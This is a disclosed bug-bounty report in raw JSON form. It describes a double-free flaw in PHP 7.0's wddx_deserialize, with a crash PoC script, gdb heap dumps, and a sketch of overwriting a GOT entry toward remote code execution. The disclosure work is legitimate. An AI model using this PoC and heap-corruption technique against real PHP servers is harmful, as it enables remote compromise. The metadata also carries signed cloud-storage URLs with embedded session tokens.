{"id":146255,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDYyNTU=","url":"https://hackerone.com/reports/146255","title":"Double Free Corruption in wddx.c (extension)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-06-21T15:52:28.912Z","submitted_at":"2016-06-21T15:52:28.912Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hoangnguyen","url":"/hoangnguyen","profile_picture_urls":{"small":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBclF3IiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--9d88f6582286e3ac06072769a81d9719f46e8235/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9VWTI5dFltbHVaVjl2Y0hScGIyNXpld2c2REdkeVlYWnBkSGxKSWd0RFpXNTBaWElHT2daRlZEb0xjbVZ6YVhwbFNTSUxOako0TmpKZUJqc0hWRG9KWTNKdmNFa2lEall5ZURZeUt6QXJNQVk3QjFRPSIsImV4cCI6bnVsbCwicHVyIjoidmFyaWF0aW9uIn19--5a32c5e1066e20d71d20163dc760c4822febc2cd/lol.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":54349,"url":"https://hackerone.com/ibb","handle":"ibb","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=20a67251fcb69fa65fa0718352cbdbc37ab8979350e68653abe9497fc7368f9f","medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134257Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1af7221520bc00daefa99cf4b250fa79737bf6e3fa8ab44b456657b80e212888"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Internet Bug Bounty","twitter_handle":"","website":"https://www.hackerone.com/internet-bug-bounty","about":"The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:35:00.257Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:34:59.406Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There are a bug double free occur in wddx_deserialize, which trying to deserialize malicious xml input from user's request.\n\nThe problem start here in :\n```\nstatic void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)\n{\n           ...snip.....\n\t} else if (!strcmp((char *)name, EL_BOOLEAN)) {\n\t\tint i;\n\n\t\tif (atts) for (i = 0; atts[i]; i++) {\n\t\t\tif (!strcmp((char *)atts[i], EL_VALUE) \u0026\u0026 atts[++i] \u0026\u0026 atts[i][0]) {\n\t\t\t\tent.type = ST_BOOLEAN;\n\t\t\t\tSET_STACK_VARNAME;\n\n\t\t\t\tZVAL_TRUE(\u0026ent.data);\n\t\t\t\twddx_stack_push((wddx_stack *)stack, \u0026ent, sizeof(st_entry));\n\t\t\t\tphp_wddx_process_data(user_data, atts[i], strlen((char *)atts[i]));\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n```\nWhen wddx_deserialize a tag \u003cboolean value=\"true/false\"\u003e they get content of value and then pass to  php_wddx_process_data(user_data, atts[i], strlen((char *)atts[i])); directly.\n\n```\nstatic void php_wddx_process_data(void *user_data, const XML_Char *s, int len)\n{\n           ...snip.....\n          wddx_stack_top(stack, (void**)\u0026ent); //return element in top of the stack\n           switch (ent-\u003etype) {\n\t\t\tcase ST_BOOLEAN:\n\t\t\t\tif (!strcmp((char *)s, \"true\")) {\n\t\t\t\t\tZ_LVAL(ent-\u003edata) = 1;\n\t\t\t\t} else if (!strcmp((char *)s, \"false\")) {\n\t\t\t\t\tZ_LVAL(ent-\u003edata) = 0;\n\t\t\t\t} else {\n\t\t\t\t\tzval_ptr_dtor(\u0026ent-\u003edata);\n\t\t\t\t\tif (ent-\u003evarname) {\n\t\t\t\t\t\tefree(ent-\u003evarname);\n\t\t\t\t\t}\n\t\t\t\t\tZVAL_UNDEF(\u0026ent-\u003edata);\n\t\t\t\t}\n\t\t\t\tbreak;\n        ...snip....\n}\n```\nIn php_wddx_process_data they just compare value data with \"true\" or \"false\" and set 0/1 to ent-\u003edata. The  problem is if value is not true/false then they call **efree(ent-\u003evarname) ** .\nAfter that, php_wddx_process_data back to php_wddx_push_element to continute execution. If i add some string in \u003cboolean\u003e (ex: \u003cboolean value=\"none\"\u003eAAAAA\u003c/boolean\u003e ), php_wddx_process_data will call again (after php_wddx_push_element had ended) and wddx_stack_top will return the same ent in the last called  php_wddx_process_data and because s in this second call point to own xml string and ent-\u003etype still is boolean so efree(ent-\u003evarname) will hit again, and this leads to double free.\n\n### Crash Poc (Ubuntu 16.04 x86_64,PHP 7.0.4 (cli))\ntest.php\n```\n\u003c?php\n$xml = \u003c\u003c\u003cEOF\n\u003c?xml version='1.0' ?\u003e\n\u003c!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'\u003e\n\u003cwddxPacket version='1.0'\u003e\n\t\u003carray\u003e\n\t\t\u003cvar name=\"XXXXXXXX\"\u003e\n\t\t\t\u003cboolean value=\"none\"\u003eAAAAAAA\u003c/boolean\u003e\n\t\t\u003c/var\u003e\n\t\t\u003cvar name=\"YYYYYYYY\"\u003e\n\t\t\t\u003cvar name=\"ZZZZZZZZ\"\u003e\n\t\t\t\t\u003cvar name=\"EZEZEZEZ\"\u003e\n\t\t\t\t\u003c/var\u003e\n\t\t\t\u003c/var\u003e\n\t\t\u003c/var\u003e\n\t\u003c/array\u003e\n\u003c/wddxPacket\u003e\nEOF;\n$array = wddx_deserialize($xml);\n\n// echo var_dump($array);\n\nforeach($array as $key =\u003e $value){\n\techo \"{$key} : {$value}\\n\";\n}\n// php\n?\u003e\n```\n\nAnd we got :\n```\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x5959595959595959 ('YYYYYYYY')\nRBX: 0x5\nRCX: 0x14\nRDX: 0x9 ('\\t')\nRSI: 0x30 ('0')\nRDI: 0x7ffff4400040 --\u003e 0x0\nRBP: 0x7fffffffab20 --\u003e 0x7fffffffab90 --\u003e 0x7fffffffabc0 --\u003e 0x7fffffffac00 --\u003e 0x7fffffffad20 --\u003e 0x7fffffffada0 --\u003e 0x121b780 --\u003e 0x1217fe0 --\u003e 0x0\nRSP: 0x7fffffffaad0 --\u003e 0x7ffff4471100 --\u003e 0x9 ('\\t')\nRIP: 0x8536b1 (\u003czend_mm_alloc_small+176\u003e:\tmov    rdx,QWORD PTR [rax])\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nR13: 0x121985b (\"name=\\\"UUUUUUUU\\\"\u003e\\n\\t\\t\\t\\t\u003c/var\u003e\\n\\t\\t\\t\u003c/var\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\u003c/array\u003e\\n\u003c/wddxPacket\u003e\")\nR14: 0x1\nR15: 0x121d150 --\u003e 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8536a5 \u003czend_mm_alloc_small+164\u003e:\tmov    rax,QWORD PTR [rax+rdx*8]\n   0x8536a9 \u003czend_mm_alloc_small+168\u003e:\tmov    QWORD PTR [rbp-0x8],rax\n   0x8536ad \u003czend_mm_alloc_small+172\u003e:\tmov    rax,QWORD PTR [rbp-0x8]\n=\u003e 0x8536b1 \u003czend_mm_alloc_small+176\u003e:\tmov    rdx,QWORD PTR [rax]\n   0x8536b4 \u003czend_mm_alloc_small+179\u003e:\tmov    rax,QWORD PTR [rbp-0x28]\n   0x8536b8 \u003czend_mm_alloc_small+183\u003e:\tmov    ecx,DWORD PTR [rbp-0x34]\n   0x8536bb \u003czend_mm_alloc_small+186\u003e:\tmovsxd rcx,ecx\n   0x8536be \u003czend_mm_alloc_small+189\u003e:\tadd    rcx,0x4\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffaad0 --\u003e 0x7ffff4471100 --\u003e 0x9 ('\\t')\n0008| 0x7fffffffaad8 --\u003e 0x0\n0016| 0x7fffffffaae0 --\u003e 0xd91858 (\"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\")\n0024| 0x7fffffffaae8 --\u003e 0x500000313\n0032| 0x7fffffffaaf0 --\u003e 0x30 ('0')\n0040| 0x7fffffffaaf8 --\u003e 0x7ffff4400040 --\u003e 0x0\n0048| 0x7fffffffab00 --\u003e 0x7ffff44710f0 (\"ZZZZZZZZ\")\n0056| 0x7fffffffab08 --\u003e 0x59688\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00000000008536b1 in zend_mm_alloc_small (heap=0x7ffff4400040, size=0x30, bin_num=0x5,\n    __zend_filename=0xd91858 \"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\",\n    __zend_lineno=0x313, __zend_orig_filename=0x0, __zend_orig_lineno=0x0)\n    at /home/vagrant/Sources_Ext/php7.0-7.0.4/Zend/zend_alloc.c:1291\n1291\t\t\theap-\u003efree_slot[bin_num] = p-\u003enext_free_slot;\n```\n### Analysis in deep \n\nWhen free(XXXXXXXX)  zend_mm_alloc_small will update linked list for each size request and store the last freed chunk into heap-\u003efree_slot. Because free(XXXXXXXX) was freed 2 times then this next pointer will point to itself.\n\nAfter 1st efree(ent-\u003evarname).\n```\n[-------------------------------------code-------------------------------------]\n   0x7c6f0b \u003cphp_wddx_process_data+606\u003e:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 \u003cphp_wddx_process_data+613\u003e:  mov    rdi,rax\n   0x7c6f15 \u003cphp_wddx_process_data+616\u003e:  call   0x85637d \u003c_efree\u003e\n=\u003e 0x7c6f1a \u003cphp_wddx_process_data+621\u003e:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e \u003cphp_wddx_process_data+625\u003e:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 \u003cphp_wddx_process_data+632\u003e:\n    jmp    0x7c7005 \u003cphp_wddx_process_data+856\u003e\n   0x7c6f2a \u003cphp_wddx_process_data+637\u003e:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d \u003cphp_wddx_process_data+640\u003e:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffab80 --\u003e 0x7ffff4402a40 --\u003e 0x121d150 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n0008| 0x7fffffffab88 --\u003e 0x4f4402a60\n0016| 0x7fffffffab90 --\u003e 0x12046b0 --\u003e 0x74696873 ('shit')\n0024| 0x7fffffffab98 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0032| 0x7fffffffaba0 --\u003e 0x7ffff4402a40 --\u003e 0x121d150 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n0040| 0x7fffffffaba8 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0048| 0x7fffffffabb0 --\u003e 0xd91858 (\"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\")\n0056| 0x7fffffffabb8 --\u003e 0x20 (' ')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(\u0026ent-\u003edata);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff4471090\n```\n\nAfter the second efree(ent-\u003evarname)\n\n```\n[-------------------------------------code-------------------------------------]\n   0x7c6f0b \u003cphp_wddx_process_data+606\u003e:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 \u003cphp_wddx_process_data+613\u003e:  mov    rdi,rax\n   0x7c6f15 \u003cphp_wddx_process_data+616\u003e:  call   0x85637d \u003c_efree\u003e\n=\u003e 0x7c6f1a \u003cphp_wddx_process_data+621\u003e:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e \u003cphp_wddx_process_data+625\u003e:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 \u003cphp_wddx_process_data+632\u003e:\n    jmp    0x7c7005 \u003cphp_wddx_process_data+856\u003e\n   0x7c6f2a \u003cphp_wddx_process_data+637\u003e:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d \u003cphp_wddx_process_data+640\u003e:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffad00 --\u003e 0x7\n0008| 0x7fffffffad08 --\u003e 0x400000005\n0016| 0x7fffffffad10 --\u003e 0x1219809 (\"\\n\\t\\t\\t\u003c/boolean\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\\t\u003cvar name=\\\"YYYYYYYY\\\"\u003e\\n\\t\\t\\t\u003cvar name=\\\"ZZZZZZZZ\\\"\u003e\\n\\t\\t\\t\\t\u003cvar name=\\\"EZEZEZEZ\\\"\u003e\\n\\t\\t\\t\\t\u003c/var\u003e\\n\\t\\t\\t\u003c/var\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\u003c/array\u003e\\n\u003c/wddxPacket\u003e\")\n0024| 0x7fffffffad18 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0032| 0x7fffffffad20 --\u003e 0x7ffff4402a40 --\u003e 0x121d150 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n0040| 0x7fffffffad28 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0048| 0x7fffffffad30 --\u003e 0x121d168 --\u003e 0x0\n0056| 0x7fffffffad38 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(\u0026ent-\u003edata);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff44710c0\n```\nwe got a chunk that point to itself, because zend_mm_alloc_small() will update heap-\u003efree_slot[bin_num] = p-\u003enext_free_slot.\n\nIf we try to malloc with the same size of ent-\u003evarname (was freed) at 0x7ffff44710c0 :\n\n1st malloc : YYYYYYYY , zend_mm_alloc_small() will return with 0x7ffff44710c0 and update heap-\u003efree_slot[bin_num] = p-\u003enext_free_slot = 0x7ffff44710c0 (because 0x7ffff44710c0 point to itself as above).\n\n```\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff44710c0 (\"YYYYYYYY\")\nRBX: 0x5\nRCX: 0x12\nRDX: 0x9 ('\\t')\nRSI: 0x12046b0 (\"YYYYYYYY\")\nRDI: 0x7ffff44710c0 (\"YYYYYYYY\")\nRBP: 0x7fffffffad20 --\u003e 0x7fffffffada0 --\u003e 0x121b780 --\u003e 0x1217fe0 --\u003e 0x0\nRSP: 0x7fffffffac10 --\u003e 0x7ffff4402a40 --\u003e 0x7ffff44029c0 --\u003e 0x7ffff4402980 --\u003e 0x7ffff4402940 --\u003e 0x7ffff44028c0 --\u003e 0x7ffff4402bc0 --\u003e 0x7ffff4402c00 --\u003e 0x7ffff4402c40 --\u003e 0x7ffff4402c80 --\u003e 0x7ffff4402cc0 --\u003e 0x7ffff4402d00 --\u003e 0x7ffff4402d40 --\u003e 0x7ffff4402d80 --\u003e 0x7ffff4402dc0 --\u003e 0x7ffff4402e00 --\u003e 0x7ffff4402e40 --\u003e 0x7ffff4402e80 --\u003e 0x7ffff4402ec0 --\u003e 0x7ffff4402f00 --\u003e 0x7ffff4402f40 --\u003e 0x7ffff4402f80 --\u003e 0x7ffff4402fc0 --\u003e 0x0\nRIP: 0x7c5ce1 (\u003cphp_wddx_push_element+2802\u003e:  mov    rdx,rax)\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nR13: 0x1219828 (\"name=\\\"YYYYYYYY\\\"\u003e\\n\\t\\t\\t\u003cvar name=\\\"ZZZZZZZZ\\\"\u003e\\n\\t\\t\\t\\t\u003cvar name=\\\"EZEZEZEZ\\\"\u003e\\n\\t\\t\\t\\t\u003c/var\u003e\\n\\t\\t\\t\u003c/var\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\u003c/array\u003e\\n\u003c/wddxPacket\u003e\")\nR14: 0x1\nR15: 0x121d150 --\u003e 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7c5cd2 \u003cphp_wddx_push_element+2787\u003e:\n    lea    rsi,[rip+0x5cbb7f]        # 0xd91858\n   0x7c5cd9 \u003cphp_wddx_push_element+2794\u003e: mov    rdi,rax\n   0x7c5cdc \u003cphp_wddx_push_element+2797\u003e: call   0x856850 \u003c_estrdup\u003e\n=\u003e 0x7c5ce1 \u003cphp_wddx_push_element+2802\u003e: mov    rdx,rax\n   0x7c5ce4 \u003cphp_wddx_push_element+2805\u003e: mov    rax,QWORD PTR [rbp-0xc0]\n   0x7c5ceb \u003cphp_wddx_push_element+2812\u003e: mov    QWORD PTR [rax+0x8],rdx\n   0x7c5cef \u003cphp_wddx_push_element+2816\u003e:\n    jmp    0x7c639c \u003cphp_wddx_push_element+4525\u003e\n   0x7c5cf4 \u003cphp_wddx_push_element+2821\u003e: add    DWORD PTR [rbp-0xd8],0x1\n[------------------------------------stack-------------------------------------]\n```\n\n2nd malloc : ZZZZZZZZ , zend_mm_alloc_small() will return with 0x7ffff44710c0 again and then update \nheap-\u003efree_slot[bin_num] = p-\u003enext_free_slot = YYYYYYYY (because zend_mm_alloc_small think YYYYYYYY is the next_free_slot).\n\n3rd malloc:  EZEZEZEZ, zend_mm_alloc_small() will return YYYYYYYY for us and this lead to crash at **heap-\u003efree_slot[bin_num] = p-\u003enext_free_slot;** when zend_mm_alloc_small() try to update next_free_slot to heap-\u003efree_slot.\n\nAt this point, if we replace YYYYYYYY with an address of GOT table for example memcpy@got, zend_mm_alloc_small() will happly return this address for us, and the call memcpy(memcpy@got,EZEZEZEZE,8); in which EZEZEZEZ is value we control, this may lead to remote code execution.\n\nThis bug also works in PHP 7.0.x\n\nReferences: https://bugs.php.net/bug.php?id=72340","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:34:59.491Z","allow_singular_disclosure_after":-60408478.5282186,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":{"databaseId":84120,"asset_type":"OTHER","asset_identifier":"PHP","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1038985,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-06-26T22:31:05.039Z","updated_at":"2016-06-26T22:31:05.039Z","actor":{"url":"/ibb","ibb":false,"profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7H6NCLCA%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIBCjdoUai95GqoqRdZPvewVTGWTu7hW9M1xsEa2tnJ2wAiEApQcvVvkI%2BBsK0ecHviHNOIueIogzHcih4FNXbWCzeVkqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF%2BSeVXC33iyV8QWeSrXA1ssE%2FEGIWSZ%2FuRCd4oXxa0L1Lxp%2FgZ3zVMnFb3xAeki0kryhhssKmftZAynWR2Q1zaBR53gjdraq6wRyIKeaN10nGH%2BCzjURsH34KRC1TOwts5MYcloS6LERgqr1SpV%2B%2FyQzDTgT2kS7g6IE%2FPeoepcFFJMxl5IvtRGcabRXuEPLRYcxt7w6jKNei1awCDyq1irj02Z42QRBSTvkYgIOHYNLMFYX3E%2F0tFI1gV2NfcCmFszpeFyasntII3Gyw3H1an6BrUGChcOYIfu%2F1WTbUdNI%2Fpjmr10lpa6XlUtxFI9c0eKAVGXcoQ3EJHRTPyWcd6Gnq4TSlpHL0D54jaEQGHBDeDUxeA6DotTHBbroOpxOoq6S1nhZ0OMb3p%2BjXCBVueAHtDFqN%2Bnjx3qwjEEfRqnOUZVwu2AW7uQZCfC2vw4kynhx1t%2FbtkiC5KthO6jIzK1h%2FjH9uqYT0bwnLaiuJs7%2Fa0R8E%2FhplfGIzFmI%2BPPnknXwAmmWU9Xa%2Bm189leh9xBp6nNN7ufioFPFK77gl8s%2FXWhnHHRwfkQk2D0unemyL2YGJyVofMRhz7FlOLdoDcPt%2FVEvFBOEQOr5BaJlpQMGIbhI0gXAmjbeZwS3uck7lnUXN7N%2BDCB7ZCLBjqlASAOgKdryIO2D5AU3ejK49G6vrtKAglCcTf7cFkw0ROVtRedKGY3KUk5E3StqVBKZSdhowAIQjfqwiAkemJwzUJGbeun1p67EPamOv2EPpEqY6R88tB4ybHuSsWOJiykQnbihgfjANmR19lVcpFUZpvB6v00p8I6H%2F%2FUOjnFdoCXZkBX1hdc0Cr9U5xZqBbFVM8Hds5wc%2BboAR7bu67Z%2Fvqp9K%2BbZg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7f78fcbd4901cebb25573e0ec350b7067d118156d58f1ca268af1270a71dc78e"},"profile":{"name":"Internet Bug Bounty"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb","collaborator":{"username":"hoangnguyen","url":"/hoangnguyen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1038987,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-06-26T22:31:12.109Z","updated_at":"2016-06-26T22:31:12.109Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hoangnguyen","url":"/hoangnguyen"},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6026360,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-10-13T09:34:59.424Z","updated_at":"2019-10-13T09:34:59.424Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6285837,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-11-12T09:35:00.276Z","updated_at":"2019-11-12T09:35:0